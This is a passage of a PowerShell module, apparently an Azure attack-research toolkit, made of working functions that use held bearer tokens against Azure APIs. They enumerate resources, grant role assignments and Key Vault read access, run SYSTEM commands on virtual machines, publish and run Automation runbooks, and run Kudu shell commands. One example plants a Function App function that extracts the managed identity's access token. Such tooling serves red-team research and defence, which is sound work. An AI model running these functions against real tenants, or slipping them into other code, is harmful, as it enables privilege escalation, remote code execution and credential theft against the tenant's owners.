        -Method "GET" `
        -ContentType "application/json"
        
    $WebAppObject
}

Function Get-AllAzureRMWebApps {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure App Service web apps under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure App Service web apps under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Azure App Service web apps

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Azure App Service web apps under
    
    .EXAMPLE
    C:\PS> $WebApps = Get-AllAzureRMWebApps -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Azure App Service web apps under the subscription with ID starting with "839..." and put them into the $WebApps variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Azure App Service web apps under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Web/sites?api-version=2022-03-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $Results.value | %{
                If ($_.kind -Like "app") {
                    $WebAppObjects += $_
                }
            }
        } else {
            IF ($_.kind -Like "app") {
                $WebAppObjects += $_
            }
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $WebAppObjects
}

Function Get-AllAzureRMAKSClusters {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Azure Kubernetes Service cluster objects under a particular subscription
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Azure Kubernetes Service cluster objects under a particular subscription
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list AKS clusters

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list AKS clusters under
    
    .EXAMPLE
    C:\PS> $AKSClusters = Get-AllAzureRMAKSClusters -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all AKS clusters under the subscription with ID starting with "839..." and put them into the $AKSClusters variable
    
    .LINK
        https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all AKS Clusters under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.ContainerService/managedClusters?api-version=2022-11-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $AKSClusterObjects += $Results.value
        } else {
            $AKSClusterObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $AKSClusterObjects
}

## ####################################### ##
## Azure Key Vault Crytopgraphic Functions ##
## ####################################### ##

Function Protect-StringWithAzureKeyVaultKey {
    <#
    .SYNOPSIS
        Encrypts a user-supplied string by forming a request to the Azure Key Vault API.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Encrypts a user-supplied string by forming a request to the Azure Key Vault API.

    .PARAMETER InputString
        The string you want to encrypt

    .PARAMETER KeyVaultURL
        The URL of the target Key Vault

    .PARAMETER KeyName
        The name of the key within the target Key Vault

    .PARAMETER KeyVersion
        The version of the key you want to perform the "encrypt" action with

    .PARAMETER EncryptionAlgorithm
        The JsonWebKeyEncryptionAlgorithm you want to encrypt the string with

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to perform the "encrypt"
        action against the specified key

    .EXAMPLE
        C:\PS> Protect-StringWithAzureKeyVaultKey `
            -InputString "HelloWorld" `
            -KeyVaultURL "https://keyvault-01.vault.azure.net" `
            -KeyName "MyKey" `
            -KeyVersion "5286277fc7d24293a8fe4119f9781804" `
            -EncryptionAlgorithm "RSA-OAEP" `
            -Token $KVToken

        Description
        -----------
        Encrypt "HelloWorld" using the private key associated with the key named "MyKey", specifically the
        version of that key, "5286277fc7d24293a8fe4119f9781804", where "MyKey" resides in a key vault with
        a URL of "https://keyvault-01.vault.azure.net". Returns either an error or the encrypted string.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/rest/api/keyvault/keys/encrypt/encrypt?view=rest-keyvault-keys-7.4&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $InputString,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultURL,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVersion,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [ValidateSet(
            "A128CBC",
            "A128CBCPAD",
            "A128GCM",
            "A128KW",
            "A192CBC",
            "A192CBCPAD",
            "A192GCM",
            "A192KW",
            "A256CBC",
            "A256CBCPAD",
            "A256GCM",
            "A256KW",
            "RSA-OAEP",
            "RSA-OAEP-256",
            "RSA1_5",
            ErrorMessage="Not a valid encryption algorithm."
        )]
        [String]
        $EncryptionAlgorithm,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $plaintext = $InputString
    $plaintextBytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $base64Plaintext = [Convert]::ToBase64String($plaintextBytes)

    $encryptionRequestBody = @{
        alg = $EncryptionAlgorithm
        value = $base64Plaintext
    } | ConvertTo-Json

    # Perform the encryption request
    Try {
        $encryptionResponse = Invoke-RestMethod `
            -Uri "$($KeyVaultURL)/keys/$($KeyName)/$($KeyVersion)/encrypt?api-version=7.4" `
            -Method Post `
            -Headers @{
                "Authorization" = "Bearer $($Token)"
            } `
            -Body $encryptionRequestBody `
            -ContentType "application/json"
        $encryptionResponse.value
    }
    Catch {
        $_
    }
}

Function Unprotect-StringWithAzureKeyVaultKey {
    <#
    .SYNOPSIS
        Decrypts a user-supplied string by forming a request to the Azure Key Vault API.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Decrypts a user-supplied string by forming a request to the Azure Key Vault API.

    .PARAMETER InputString
        The string you want to decrypt

    .PARAMETER KeyVaultURL
        The URL of the target Key Vault

    .PARAMETER KeyName
        The name of the key within the target Key Vault

    .PARAMETER KeyVersion
        The version of the key you want to perform the "decrypt" action with

    .PARAMETER EncryptionAlgorithm
        The JsonWebKeyEncryptionAlgorithm the input string is encrypted with

    .PARAMETER Token
        The Azure Key Vault service scoped JWT for a principal with the ability to perform the "decrypt"
        action with the specified key

    .EXAMPLE
        C:\PS> Unprotect-StringWithAzureKeyVaultKey `
            -InputString "HelloWorld" `
            -KeyVaultURL "https://keyvault-01.vault.azure.net" `
            -KeyName "MyKey" `
            -KeyVersion "5286277fc7d24293a8fe4119f9781804" `
            -EncryptionAlgorithm "RSA-OAEP" `
            -Token $KVToken

        Description
        -----------
        Decrypt the specified string, "YDQoqdSAmEnsYSL2SSJoa_0EmR", using the private key associated with
        the key named "MyKey", specifically the version of that key, "5286277fc7d24293a8fe4119f9781804",
        where "MyKey" resides in a key vault with a URL of "https://keyvault-01.vault.azure.net". Returns
        either an error or the decrypted string.

    .INPUTS
        String

    .LINK
        https://learn.microsoft.com/en-us/rest/api/keyvault/keys/decrypt/decrypt?view=rest-keyvault-keys-7.4&tabs=HTTP
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $InputString,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVaultURL,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $KeyVersion,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [ValidateSet(
            "A128CBC",
            "A128CBCPAD",
            "A128GCM",
            "A128KW",
            "A192CBC",
            "A192CBCPAD",
            "A192GCM",
            "A192KW",
            "A256CBC",
            "A256CBCPAD",
            "A256GCM",
            "A256KW",
            "RSA-OAEP",
            "RSA-OAEP-256",
            "RSA1_5",
            ErrorMessage="Not a valid encryption algorithm."
        )]
        [String]
        $EncryptionAlgorithm,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    # Create the request body for decryption
    $decryptionRequestBody = @{
        alg   = $EncryptionAlgorithm
        value = $InputString
    } | ConvertTo-Json
    
    # Perform the decryption request
    Try {
        $decryptionResponse = Invoke-RestMethod `
            -Uri "$($KeyVaultURL)/keys/$($KeyName)/$($KeyVersion)/decrypt?api-version=7.4" `
            -Method Post `
            -Headers @{
                "Authorization" = "Bearer $($Token)"
            } `
            -Body $decryptionRequestBody `
            -ContentType "application/json"
        
        $decryptedValue = $decryptionResponse.value
        
        $remainder = $decryptedValue.Length % 4
        if ($remainder -ne 0) {
            $paddedDecryptedValue = $decryptedValue.PadRight($decryptedValue.Length + (4 - $remainder), '=')
        } else {
            $paddedDecryptedValue = $decryptedValue
        }
        
        $decryptedBytes = [Convert]::FromBase64String($paddedDecryptedValue)
        $decryptedText = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
        
        $decryptedText
    }
    Catch {
        $_
    }
    
}

## #################################################### ##
## Azure Resource Manager Object Manipulation Functions ##
## #################################################### ##

Function New-AzureRMRoleAssignment {
    <#
    .SYNOPSIS
        Grant an AzureRM role assignment to a principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Grants an AzureRM role assignment to an existing Entra principal. You must wait at least 2 minutes before using the role assignment: https://docs.microsoft.com/en-us/azure/key-vault/general/rbac-guide?tabs=azure-cli#known-limits-and-performance

    .PARAMETER PrincipalId
        The object ID of the existing Entra principal to which you are granting the AzureRM role

    .PARAMETER AzureRMRoleID
        The ID of the AzureRM Role you are granting to the Entra principal

    .PARAMETER TargetObjectID
        The ID of the AzureRM object you are scoping the role assignment against

    .PARAMETER Token
        The AzureRM scoped JWT for a principal with the ability to add new role assignments to the target object.

    .EXAMPLE
        C:\PS> New-AzureRMRoleAssignment `
            -PrincipalId "e21abf7a-1fe6-405f-90c0-46e1ce5360e6" `
            -AzureRMRoleID "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/4465e953-8ced-4406-a58e-0f6e3f3b530b" `
            -TargetObjectID "f1816681-4df5-4a31-acfa-922401687008" `
            -Token $ARMToken

        Description
        -----------
        Grant the AzureRM role with ID of "/subscriptions/f18.../providers/Microsoft.Authorization/roleDefinitions/446..." to the principal with ObjectID of "e21..." against the object whose ID starts with "f18..."

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PrincipalId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AzureRMRoleID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $body = @{
        properties = @{
            roleDefinitionId    =   $AzureRMRoleID
            principalId         =   $PrincipalId
        }
    }
    $RoleAssignmentGUID = ([GUID]::NewGuid()).toString()

    $URI = "https://management.azure.com/subscriptions/$($TargetObjectID)/providers/Microsoft.Authorization/roleAssignments/$($RoleAssignmentGUID)?api-version=2018-01-01-preview"

    $GrantAzureRMRole = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)"} `
        -URI            $URI `
        -Method         PUT `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $GrantAzureRMRole

}
New-Variable -Name 'New-AzureRMRoleAssignmentDefinition' -Value (Get-Command -Name "New-AzureRMRoleAssignment") -Force
New-Variable -Name 'New-AzureRMRoleAssignmentAst' -Value (${New-AzureRMRoleAssignmentDefinition}.ScriptBlock.Ast.Body) -Force

Function New-AzureKeyVaultAccessPolicy {
    <#
    .SYNOPSIS
        Grant a principal the "Get" and "List" permissions across secrets, keys, and certificates on a particular key vault.

        TODO: Let the user specify with more granulaity what permissions they want to add.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Grant a principal the "Get" and "List" permissions across secrets, keys, and certificates on a particular key vault.
        You must wait at least 2 minutes before using the new access policy privilege:
        https://docs.microsoft.com/en-us/azure/key-vault/general/rbac-guide?tabs=azure-cli#known-limits-and-performance

    .PARAMETER PrincipalID
        The object ID of the existing Entra principal to which you are granting the Azure Key Vault access

    .PARAMETER TenantID
        The unique identifier of the Entra tenant the principal resides in

    .PARAMETER TargetObjectID
        The ID of the Azure Key Vault you are granting the access policy against

    .PARAMETER Token
        The AzureRM scoped JWT for a principal with the ability to add a new access policy to the target key vault

    .EXAMPLE
        C:\PS> New-AzureKeyVaultAccessPolicy `
            -TargetObjectID "/subscriptions/7c669b03-41d0-4ed6-ac55-806bdcdfa84a/resourceGroups/KeyVaults/providers/Microsoft.KeyVault/vaults/KeyVault-01" `
            -TenantID "d5ba96aa-6cf5-4a9e-a942-a949834d1e85" `
            -PrincipalID "80634281-d7ea-4361-837c-22222637af9e" `
            -Token $Token

        Description
        -----------
        Give the principal with ID starting with "8063...", which resides in the tenant with ID starting with "d5ba...", "Get" and "List" access on the key vault "KeyVault-01"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $Body = @{
      properties = @{
        accessPolicies = @(
          @{
            tenantId = $TenantID
            objectId = $PrincipalID
            permissions = @{
              keys = @(
                "get"
                "list"
              )
              secrets = @(
                "get"
                "list"
              )
              certificates = @(
                "get"
                "list"
              )
            }
          }
        )
      }
    }

    $URI = "https://management.azure.com$($TargetObjectID)/accessPolicies/add?api-version=2021-10-01"

    $AddKeyVaultReadAccess = Invoke-RestMethod `
        -URI $URI `
        -Method PUT `
        -Headers @{
            Authorization = "Bearer $($Token)"
        } `
        -ContentType "application/json" `
        -Body ($Body | ConvertTo-Json -Depth 5)

    $AddKeyVaultReadAccess
}

Function Invoke-AzureRMVMRunCommand {
    <#
    .SYNOPSIS
        Attempts to run a SYSTEM command on an Azure Virtual Machine via the runCommand endpoint

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to run a SYSTEM command on an Azure Virtual Machine via the runCommand endpoint

    .PARAMETER TargetVMId
        The unique identifier of the Azure Virtual Machine

    .PARAMETER Token
        The AzureRM-scoped JWT for the principal with the ability to run a command on the VM

    .PARAMETER Script
        The PowerShell script you want to run on the VM

    .EXAMPLE
        C:\PS> Invoke-AzureRMVMRunCommand `
            -Token $ARMToken `
            -TargetVMId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/VirtualMachines/providers/Microsoft.Compute/virtualMachines/MyWin10VirtualMachine" `
            -Script "whoami"

        Description
        -----------
        Attempts to run "whoami" as a SYSTEM command via the runCommand endpoint on the MyWin10VirtualMachine VM.

    .LINK
        https://medium.com/p/74aee1006f48
        https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-privilege-escalation-using-managed-identities/
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetVMId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        $Script

    )

    $URI = "https://management.azure.com/$($TargetVMId)/runCommand?api-version=2018-04-01"
    
    $Body = @{
        commandId = "RunPowerShellScript"
        script = @($Script)
    }
    
    $RunCommandRequest = Invoke-RestMethod `
        -Uri $URI `
        -Method POST `
        -Headers @{Authorization = "Bearer $Token"} `
        -ContentType "application/json" `
        -Body $($Body | ConvertTo-Json) `
        -ResponseHeadersVariable "Headers"
    
    $AsyncLocation = $Headers.'Azure-AsyncOperation'
    
    $RefreshAttempts = 0
    Do {
      $AsyncJob = Invoke-RestMethod `
        -Uri $AsyncLocation[0] `
        -Method GET `
        -Headers @{Authorization = "Bearer $Token"}
      $RefreshAttempts++
      Start-Sleep -s 6
    } Until (
        $AsyncJob.status -Like "Succeeded" -Or $RefreshAttempts -GT 30
    )
    
    $CommandOutput = $AsyncJob.properties.output.value | ?{$_.code -Like "ComponentStatus/StdOut/succeeded"} | Select -ExpandProperty message
    
    $CommandOutput
}

Function New-PowerShellFunctionAppFunction {
    <#
    .SYNOPSIS
        Create a new function in an existing Function App. The function must be a PowerShell formatted script.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Create a new function in an existing Function App

    .PARAMETER Token
        The AzureRM-scoped JWT for principal with the ability to add a function to the target function app

    .PARAMETER PathToFunctionApp
        The full URI path to the target function app

    .PARAMETER FunctionName
        The name of the new function you are adding to the function app

    .PARAMETER PowerShellScript
        The PowerShell script you want the new function to execute

    .EXAMPLE
        C:\PS> $Script = '
            using namespace System.Net
            param($Request, $TriggerMetadata)
            $resourceURI = "https://graph.microsoft.com/"
            $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=$resourceURI&api-version=2017–09–01"
            $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI
            Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
            StatusCode = [HttpStatusCode]::OK
            Body = $tokenResponse
        })
        '

        C:\PS> New-PowerShellFunctionAppFunction `
            -Token $ServicePrincipalBToken `
            -PathToFunctionApp "https://management.azure.com/subscriptions/bf510275-8a83-4932-988f-1b148b83f832/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp" `
            -FunctionName "NewFunction3" `
            -PowerShellScript $Script 

        Description
        -----------
        Add a function to "MyCoolFunctionApp" which will extract a JWT for the function app's managed identity service principal

    .LINK
        https://medium.com/p/300065251cbe
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $FunctionName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PowerShellScript
    )

    $URI = "$($PathToFunctionApp)/functions/$($FunctionName)?api-version=2018-11-01"
    
    $Body = @{
        id = "$($PathToFunctionApp)/functions/$($FunctionName)"
        properties = @{
            name = $FunctionName
            files = @{
                "run.ps1" = $PowerShellScript
            }
            test_data = "asdf"
            config = @{
                bindings = @(
                    @{
                        authLevel = "function"
                        type = "httpTrigger"
                        direction = "in"
                        name = "Request"
                        methods = @(
                            "get"
                            "post"
                        )
                    }
                    @{
                        type = "http"
                        direction = "out"
                        name = "Response"
                    }
                )
            }
        }
    } | ConvertTo-Json -Depth 5
   
    Try {
        $CreateFunction = Invoke-RestMethod `
            -Method PUT `
            -URI $URI `
            -Body $Body `
            -Headers @{
                "authorization"="Bearer $($Token)"
            } `
            -ContentType "application/json"
        $Success = $True
    }
    Catch {
        $_
    }
}

Function New-AzureAutomationAccountRunBook {
    <#
    .SYNOPSIS
        Add a runbook to an existing Automation Account

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Add a runbook to an existing Automation Account

    .PARAMETER Token
        The AzureRM-scoped JWT for the test principal

    .PARAMETER RunBookName
        The name you want to give to the new runbook

    .PARAMETER AutomationAccountPath
        The full URL path to the Automation Account

    .PARAMETER Script
        The command you want to run

    .EXAMPLE
        C:\PS> New-AzureAutomationAccountRunBook `
            -Token $ARMToken `
            -RunBookName "MyCoolRunBook" `
            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `
            -Script "whoami"

        Description
        -----------
        Publish a new runbook to an existing automation account called "MyCoolAutomationAccount"

    .LINK
        https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AutomationAccountPath,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RunBookName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Script
    )
    
    Try {
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    content = @{
                        name = $RunBookName
                        location = "eastus"
                        properties = @{
                            runbookType = "PowerShell7"
                            description = "asdf"
                            logProgress = "false"
                            logVerbose = "false"
                            draft = @{}
                        }
                    }
                    httpMethod = "PUT"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($RunBookName)?api-version=2017-05-15-preview"
                }
            )
        }
        $CreateDraft = Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 5)

        # Add script to the runbook
        $URI = "$($AutomationAccountPath)/runbooks/$($RunBookName)/draft/content?api-version=2015-10-31"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -URI $URI `
            -Method PUT `
            -Body $Script `
            -ContentType "text/powershell"

        # Publish the runbook
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    httpMethod = "POST"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($RunBookName)/publish?api-version=2018-06-30"
                }
            )
        }
        Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($Token)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 3)
    }
    Catch {
        $_
    }
}

Function Get-AzureAutomationAccountRunBookOutput {
    <#
    .SYNOPSIS
        Run an existing Automation Account runbook and retrieve its output

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Run an existing Automation Account runbook and retrieve its output

    .PARAMETER Token
        The AzureRM-scoped JWT for the test principal

    .PARAMETER RunBookName
        The name of the runbook you want to run

    .PARAMETER AutomationAccountPath
        TThe full URL path to the Automation Account

    .EXAMPLE
        C:\PS> Get-AzureAutomationAccountRunBookOutput `
            -Token $ARMToken `
            -RunBookName "MyCoolRunBook" `
            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"

        Description
        -----------
        Publish a new runbook to an existing automation account called "MyCoolAutomationAccount"

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AutomationAccountPath,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RunBookName
    )
    
    Try {
        $GUID = New-GUID
        $Body = @{
            requests = @(
                @{
                    content = @{
                        properties = @{
                            parameters = @{
                                }
                        runbook = @{
                            name = $RunBookName
                        }
                        runOn = ""
                        }
                    }
                    httpMethod = "PUT"
                    name = (New-GUID).GUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/jobs/$($GUID)?api-version=2017-05-15-preview"
                }
            )
        }
        $Request = Invoke-WebRequest -UseBasicParsing -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
        -Method "POST" `
        -WebSession $session `
        -Headers @{
          "Authorization"="Bearer $($Token)"
        } `
        -ContentType "application/json" `
        -Body $($Body | ConvertTo-JSON -Depth 5)
        
        $RefreshAttempts = 0
        Do {
          $RunBookJobOutput = Invoke-RestMethod `
            -Uri "$($AutomationAccountPath)/jobs/$($GUID)/output?api-version=2017-05-15-preview&_=1663548574053" `
            -Method GET `
            -Headers @{Authorization = "Bearer $($Token)"}
          $RefreshAttempts++
          Start-Sleep -s 6
        } Until (
            $RunBookJobOutput.Length -GT 0 -Or $RefreshAttempts -GT 10
        )
        
        $RunBookJobOutput

    }
    Catch {
        $_
    }
}

Function Invoke-AzureRMWebAppShellCommand {
    <#
    .SYNOPSIS
        This function takes a provided JWT or Base64-encoded authentication string, then uses those to authenticate to a provided
        Kudu URI for an Azure App Service Web App. If successful, returns the command output. If an error occurs, prints the error.
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    .DESCRIPTION
        This function takes a provided JWT or Base64-encoded authentication string, then uses those to authenticate to a provided
        Kudu URI for an Azure App Service Web App. If successful, returns the command output. If an error occurs, prints the error.
    .PARAMETER Token
        An AzureRM-scoped JSON Web Token (JWT) for a principal with "Owner", "Contributor", or "Website Contributor" role against the
        Azure Web App.
    .PARAMETER BasicAuthString
        The Base64-encoded username and password for the FTPS, application-scope credentials.
    .PARAMETER KuduURI
        The URI for the Kudu "buddy site". If the Azure Web App's URL is https://mycoolwindowswebapp.azurewebsites.net/, the KuduURI will
        be https://mycoolwindowswebapp.scm.azurewebsites.net/api/command
    .PARAMETER Command
        The shell command you want to run. You may need to use base64 encoding in your command to deal with quotation issues as the command
        will be parsed by the Kudu process before being executed. See the examples for an example of how to do this.
    .EXAMPLE
        PS C:\> $Username = "`$mycoolwindowswebapp"
        PS C:\> $Password = "asdf1234"
        PS C:\> $base64Auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("$($Username):$($Password)")))
        PS C:\> Invoke-AzureRMWebAppShellCommand -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" -basicauthstring $base64Auth -Command "hostname"
        Description
        -----------
        Authenticates to the Kudu API endpoint using basic authentication, using the Username and Password provided. Runs the "hostname" command
